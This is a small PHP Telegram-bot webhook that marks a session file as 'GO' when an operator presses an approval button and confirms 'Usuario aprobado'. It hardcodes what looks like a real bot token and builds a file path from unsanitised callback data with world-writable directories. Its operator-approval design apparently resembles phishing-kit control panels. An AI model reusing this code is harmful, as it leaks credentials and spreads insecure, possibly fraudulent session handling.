<?php

$token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";

$input = file_get_contents("php://input");
$update = json_decode($input, true);

if(!$update) exit;

/* ========================= */
/* BOTÓN TELEGRAM */
/* ========================= */

if(isset($update["callback_query"])){

    $callback_id = $update["callback_query"]["id"];
    $chat_id = $update["callback_query"]["message"]["chat"]["id"];
    $data = $update["callback_query"]["data"];

    /* RESPONDER A TELEGRAM (IMPORTANTE) */
    file_get_contents(
        "https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callback_id"
    );

    if(strpos($data, "GO_") === 0){

        $id = str_replace("GO_", "", $data);

        $dir = __DIR__ . "/sesiones/";

        if(!file_exists($dir)){
            mkdir($dir, 0777, true);
        }

        $file = $dir . $id . ".txt";

        /* 🔥 ESCRITURA SEGURA */
        file_put_contents($file, "GO", LOCK_EX);

        file_get_contents(
            "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=✅ Usuario aprobado ID:$id"
        );
    }
}